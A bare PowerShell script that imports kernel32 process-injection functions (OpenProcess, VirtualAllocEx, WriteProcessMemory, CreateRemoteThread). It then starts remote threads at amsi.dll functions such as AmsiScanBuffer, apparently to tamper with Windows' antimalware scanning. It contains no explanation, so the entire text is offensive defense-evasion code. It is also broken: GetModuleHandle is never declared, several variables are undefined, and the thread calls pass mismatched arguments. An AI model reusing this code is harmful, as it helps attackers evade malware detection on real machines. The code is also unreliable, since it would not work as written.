# Define necessary constants
$PROCESS_CREATE_THREAD = 0x0002
$PROCESS_VM_OPERATION = 0x0008
$PROCESS_VM_WRITE = 0x0020
$PROCESS_VM_READ = 0x0010
$PAGE_READWRITE = 0x04
$PROCESS_QUERY_INFORMATION = 0x0400
$PROCESS_ALL_ACCESS = 0x001F0FFF

# Define necessary functions
$Kernel32 = Add-Type -Name Kernel32 -Namespace Win32 -MemberDefinition @"
[DllImport("kernel32.dll")]
public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

[DllImport("kernel32.dll")]
public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out int lpNumberOfBytesWritten);

[DllImport("kernel32.dll", SetLastError = true)]
public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("kernel32.dll")]
public static extern bool CloseHandle(IntPtr hObject);

[DllImport("kernel32.dll")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

[DllImport("kernel32.dll")]
public static extern IntPtr LoadLibrary(string lpFileName);
"@

$AmsiDll = "amsi.dll"
$AmsiSession = [IntPtr]::Zero
$AmsiOpenSession = $Kernel32::GetProcAddress.Invoke($Kernel32::GetModuleHandle.Invoke($AmsiDll), "AmsiOpenSession")
$AmsiInitialize = $Kernel32::GetProcAddress.Invoke($Kernel32::GetModuleHandle.Invoke($AmsiDll), "AmsiInitialize")
$AmsiCloseSession = $Kernel32::GetProcAddress.Invoke($Kernel32::GetModuleHandle.Invoke($AmsiDll), "AmsiCloseSession")
$AmsiUninitialize = $Kernel32::GetProcAddress.Invoke($Kernel32::GetModuleHandle.Invoke($AmsiDll), "AmsiUninitialize")
$AmsiScanBuffer = $Kernel32::GetProcAddress.Invoke($Kernel32::GetModuleHandle.Invoke($AmsiDll), "AmsiScanBuffer")
$Kernel32::CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, 0, $AmsiOpenSession, [IntPtr]$AmsiSession) | Out-Null
$Kernel32::CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, 0, $AmsiInitialize, [IntPtr]([UInt64]$AmsiSession), [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
$AmsiContext = New-Object PSObject -Property @{
    Session = $AmsiSession
    Handle = [IntPtr]::Zero
}
$Kernel32::CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, 0, $AmsiScanBuffer, $AmsiContext, [IntPtr]$BufferAddress, [IntPtr]($BufferSize)) | Out-Null
$Kernel32::CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, 0, $AmsiUninitialize, [IntPtr]([UInt64]$AmsiSession), [IntPtr]::Zero, [IntPtr]::Zero) | Out-Null
$Kernel32::CreateRemoteThread.Invoke($ProcessHandle, [IntPtr]::Zero, 0, $AmsiCloseSession, [IntPtr]([UInt64]$AmsiSession)) | Out-Null
